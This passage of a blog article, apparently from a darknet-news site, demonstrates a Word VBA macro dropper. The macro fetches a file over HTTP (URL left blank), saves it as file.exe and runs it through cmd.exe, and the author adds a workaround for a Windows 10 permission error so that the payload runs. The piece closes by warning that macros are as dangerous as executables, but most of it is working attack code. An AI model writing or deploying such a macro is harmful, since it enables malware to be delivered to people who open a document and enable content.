id="crayon-5963870fc2d53344166230-38">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-39"><span class="crayon-s">.Open</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-40">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-41"><span class="crayon-s">.write xHttp.responseBody</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-42">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-43"><span class="crayon-s">.savetofile "file.exe", 2 '</span><span class="crayon-c">//overwrite</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-44">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-45"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-e">With</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-46">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-47"><span class="crayon-e">Shell</span><span class="crayon-sy">(</span><span class="crayon-s">"cmd.exe /S /K"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-s">"file.exe"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-48">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-49"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-e">Sub</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-50">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-51"><span class="crayon-e">Dim </span><span class="crayon-v">xHttp</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">xHttp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Microsoft.XMLHTTP"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-52">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-53"><span class="crayon-e">Dim </span><span class="crayon-v">bStrm</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Set </span><span class="crayon-v">bStrm</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Adodb.Stream"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-54">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-55"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-i">Open</span><span class="crayon-h"> </span><span class="crayon-s">"GET"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"http:///"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">False</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-56">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-57"><span class="crayon-v">xHttp</span><span class="crayon-sy">.</span><span class="crayon-e">Send</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-58">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-59"><span class="crayon-e">With </span><span class="crayon-i">bStrm</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-60">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-61"><span class="crayon-sy">.</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-s">'//binary</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-62">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-63"><span class="crayon-s">.Open</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-64">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-65"><span class="crayon-s">.write xHttp.responseBody</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-66">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-67"><span class="crayon-s">.savetofile "file.exe", 2 '</span><span class="crayon-c">//overwrite</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-68">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-69"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-e">With</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-70">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-71"><span class="crayon-e">Shell</span><span class="crayon-sy">(</span><span class="crayon-s">"cmd.exe /S /K"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-s">"file.exe"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5963870fc2d53344166230-72">&nbsp;</div><div class="crayon-line" id="crayon-5963870fc2d53344166230-73"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-v">Sub</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    Simple script downloads and executes, just by enabling content on a document.</p>
    <p>Malmoe used Shell(file.exe”) which causes a permission error on my Windows 10 MS Word 2010. However if I use this workaround from my fork bomb</p>
    <div id="crayon-5963870fc2d59172580158" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    Shell("cmd.exe /S /K" &amp; "file.exe")</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5963870fc2d59172580158-1">1</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5963870fc2d59172580158-1"><span class="crayon-e">Shell</span><span class="crayon-sy">(</span><span class="crayon-s">"cmd.exe /S /K"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-s">"file.exe"</span><span class="crayon-sy">)</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    &#8230;downloaded program executes normally.</p>
    <p><strong>Conclusion</strong></p>
    <p>Word macros are a bit restricted Visual Basic executables. With some sneakiness, it can be used to compromise a system by downloading and executing a &#8216;real&#8217; .exe &#8211; macros are as dangerous as executables!</p>
    </div>
    <span style="display:none"><a href="https://www.deepdotweb.com/tag/dangers/" rel="tag">dangers</a> <a href="https://www.deepdotweb.com/tag/doc/" rel="tag">doc</a> <a href="https://www.deepdotweb.com/tag/documents/" rel="tag">documents</a> <a href="https://www.deepdotweb.com/tag/ms/" rel="tag">ms</a> <a href="https://www.deepdotweb.com/tag/word/" rel="tag">word</a></span> <span style="display:none" class="updated">2016-12-15</span>
    <div style="display:none" class="vcard author" itemprop="author" itemscope itemtype="http://schema.org/Person"><strong class="fn" itemprop="name"><a href="https://www.deepdotweb.com/author/filipjelic/" title="Posts by Filip Jelic" rel="author">Filip Jelic</a></strong></div>
    </div>
</article>

